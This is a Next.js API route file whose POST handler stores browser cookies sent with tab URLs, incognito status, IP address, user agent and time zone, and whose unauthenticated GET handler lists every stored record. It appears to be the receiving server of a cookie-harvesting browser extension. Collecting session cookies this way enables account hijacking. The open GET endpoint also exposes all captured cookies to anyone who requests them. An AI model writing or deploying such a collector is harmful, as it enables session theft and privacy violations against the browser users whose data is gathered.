import { NextRequest, NextResponse } from "next/server";
import { db } from "@/db";
import { cookies } from "@/db/schema";
import { desc, eq, sql } from "drizzle-orm";

// POST handler to store cookies
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { cookies: cookiesArray, tabInfo, userInfo, timestamp } = body;

    const result = await db
      .insert(cookies)
      .values({
        url: tabInfo.url,
        tabId: tabInfo.id,
        tabTitle: tabInfo.title,
        favIconUrl: tabInfo.favIconUrl || null,
        incognito: tabInfo.incognito || false,
        cookiesData: cookiesArray,
        ipAddress: userInfo.ipAddress,
        userAgent: userInfo.browserInfo.userAgent,
        language: userInfo.browserInfo.language,
        timeZone: userInfo.browserInfo.timeZone,
        createdAt: new Date(timestamp),
      })
      .returning({ id: cookies.id });

    return NextResponse.json(
      {
        success: true,
        message: "Cookies stored successfully",
        id: result[0].id,
      },
      { status: 201 }
    );
  } catch (error: any) {
    console.error("Error storing cookies:", error);
    return NextResponse.json(
      {
        success: false,
        message: "Failed to store cookies",
        error: error.message,
      },
      { status: 500 }
    );
  }
}

// GET handler to fetch cookies
export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams;
    const page = parseInt(searchParams.get("page") || "1");
    const limit = parseInt(searchParams.get("limit") || "10");
    const url = searchParams.get("url") || null;

    const offset = (page - 1) * limit;

    let query = db.select().from(cookies);

    // Apply URL filter if provided
    if (url) {
      query = query.where(eq(cookies.url, url)) as typeof query;
    }

    // Apply pagination and sorting
    const data = await query
      .orderBy(desc(cookies.createdAt))
      .limit(limit)
      .offset(offset);

    // Get total count for pagination
    const countQuery = db.select({ count: sql`count(*)` }).from(cookies);
    if (url) {
      countQuery.where(eq(cookies.url, url));
    }

    const totalCount = await countQuery as { count: bigint }[];
    const total = parseInt(totalCount[0].count.toString());

    return NextResponse.json({
      success: true,
      data,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit),
      },
    });
  } catch (error: any) {
    console.error("Error fetching cookies:", error);
    return NextResponse.json(
      {
        success: false,
        message: "Failed to fetch cookies",
        error: error.message,
      },
      { status: 500 }
    );
  }
}
